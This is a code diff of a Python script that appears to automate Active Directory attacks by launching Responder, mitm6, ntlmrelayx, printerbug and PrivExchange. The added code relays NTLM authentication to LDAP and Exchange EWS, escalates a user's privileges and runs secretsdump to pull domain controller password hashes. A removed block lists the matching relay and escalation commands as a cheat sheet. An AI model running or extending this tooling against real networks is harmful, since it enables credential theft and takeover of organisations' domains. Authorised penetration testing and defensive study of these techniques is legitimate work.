@@ -12,15 +12,18 @@ def create_ntlmrelayx_cmd(args):
     """
     Creates the ntlmrelayx cmommand string
     """
-    relay_cmd = f'python {cwd}/tools/ntlmrelayx.py -of {cwd}/hashes/ntlmrelay-hashes.txt -smb2support'
+    relay_cmd = f'python {cwd}/tools/impacket/examples/ntlmrelayx.py -of {cwd}/hashes/ntlmrelay-hashes.txt -smb2support'
 
     # PrinterBug/PrivExchange
-    if args.user:
+    if args.privexchange or args.printerbug:
         dom, user, pw = parse_creds(args)
         relay_cmd += f' --escalate-user {user} -t ldap://{args.domain_controller}'
         # PrinterBug
-        if not args.privexchange:
+        if args.printerbug:
             relay_cmd += ' --remove-mic'
+
+    elif args.httpattack:
+        relay_cmd += f' -t https://{args.exchange_server}/EWS/Exchange.asmx'
 
     # Relay
     else:
@@ -46,8 +49,8 @@ def start_ntlmrelayx(args):
     Start ntlmrelayx
     """
     cmd = create_ntlmrelayx_cmd(args)
-    logfile_name = 'ntlmrelayx'
-    ntlmrelayx = start_process(cmd, logfile_name, live_output=True)
+    name = 'ntlmrelayx'
+    ntlmrelayx = start_process(cmd, name, live_output=True)
 
     return ntlmrelayx
 
@@ -79,8 +82,8 @@ def start_responder(iface):
     edit_responder_conf(switch, protocols, conf)
     cmd = f'python2 {cwd}/tools/Responder/Responder.py -wrd -I {iface}'
 
-    logfile_name = 'responder'
-    responder = start_process(cmd, logfile_name)
+    name = 'responder'
+    responder = start_process(cmd, name)
 
     return responder
 
@@ -91,60 +94,51 @@ def start_mitm6(args):
     if args.interface:
         cmd = cmd + f' -i {args.interface}'
 
-    logfile_name = 'mitm6'
-    mitm6 = start_process(cmd, logfile_name)
+    name = 'mitm6'
+    mitm6 = start_process(cmd, name)
 
     return mitm6
 
 def start_exchange_scan(args):
-    with open(args.exchange_file, "r") as f:
-        target = f.readlines()[0].strip()
-    cmd = f'python {cwd}/tools/cve-2019-1040-scanner/scan.py -target-file {args.exchange_file} {args.user}@{target}'
-    logfile_name = "exchange_scanner"
-    scan = start_process(cmd, logfile_name, live_output=True)
+    if args.exchange_file:
+        with open(args.exchange_file, "r") as f:
+            target = f.readlines()[0].strip()
+        cmd = f'python {cwd}/tools/cve-2019-1040-scanner/scan.py -target-file {args.exchange_file} {args.user}@{target}'
+
+    elif args.exchange_server:
+        cmd = f"python {cwd}/tools/cve-2019-1040-scanner/scan.py '{args.user}@{args.exchange_server}'"
+
+    name = "exchange_scanner"
+    scan = start_process(cmd, name, live_output=True)
 
     return scan
 
 def start_printerbug(dom_user_passwd, exchange_server, local_ip):
     cmd = f'python {cwd}/tools/krbrelayx/printerbug.py {dom_user_passwd}@{exchange_server} {local_ip}'
-    logfile = 'printerbug'
-    printerbug = start_process(cmd, logfile)
+    name = 'printerbug'
+    printerbug = start_process(cmd, name)
 
     return printerbug
 
 def start_privexchange(args, local_ip):
     dom, user, passwd = parse_creds(args)
-    with open(args.exchange_file, "r+") as f:
-        lines = f.readlines()
-        exchange_server = lines[0].strip()
-    cmd = f'python {cwd}/tools/PrivExchange/privexchange.py -ah {local_ip}, -u {user} -p \'{passwd}\' -d {dom} {exchange_server}'
-    logfile = 'privexchange'
-    privexchange = start_process(cmd, logfile)
+    cmd = f'python {cwd}/tools/PrivExchange/privexchange.py -ah {local_ip} -u {user} -p \'{passwd}\' -d {dom} {args.exchange_server}'
+    name = 'privexchange'
+    privexchange = start_process(cmd, name)
     return privexchange
 
+def start_secretsdump(args):
+    dom, user, passwd = parse_creds(args)
+    cmd = f'python {cwd}/tools/impacket/examples/secretsdump.py {dom}/{user}:{passwd}@{args.domain_controller} -just-dc'
+    name = 'secretsdump'
+    secretsdump = start_process(cmd, name, live_output=True)
 
-def start_process(cmd, logfile_name, live_output=False):
-    proc = Process(cmd)
-    logfile = f'{cwd}/logs/{logfile_name}.log'
+    return secretsdump
+
+def start_process(cmd, name, live_output=False):
+    proc = Process(cmd, name)
+    logfile = f'{cwd}/logs/{name}.log'
     print_info(f"Running {proc.cmd}")
     proc.run(logfile, live_output=live_output)
 
     return proc
-
-# regular
-'python {}/tools/ntlmrelayx.py -tf smb-unsigned-hosts.txt -of {}/hashes-ntlmrelay-hashes -smb2support'
-'python2 {}/tools/Responder/Responder.py -wrd -I <iface>'
-# mitm6
-'python {}/tools/ntlmrelayx.py -tf smb-unsigned-hosts.txt -6 -wh NetProxy-Service -wa 2 -smb2support'
-'mitm6 -d <domain> --ignore-nofqnd'
-'python2 {}/tools/Responder/Responder.py -wrd -I <iface>'
-# PrivExchange
-'python {}/tools/ntlmrelayx.py -t ldap://<DC> --remove-mic --escalate-user <UserYouHavePassFor>'
-'python {}/tools/privexchange.py -ah <AttackerHost> <DC> -u <UserYouHavePassFor> -d testsegment.local'
-# CVE-2019-1040
-'python printerbug.py <DOMAIN/user>@<exchangeServer> <attacker ip>'
-'ntlmrelayx.py --remove-mic --escalate-user <UserYouHavePassFor> -t ldap://<DC> -smb2support'
-# SMB no admin - note tf should be in format smb://IP
-'python ntlmrelayx.py -tf smb-unsigned-hosts.txt -socks -smb2support'
-'ntlmrelayx> socks' # list all socks connections
-'proxychains smbclient //<targetIP>/c$ -U <DOMAIN/user listed in captured SMB sessions>'
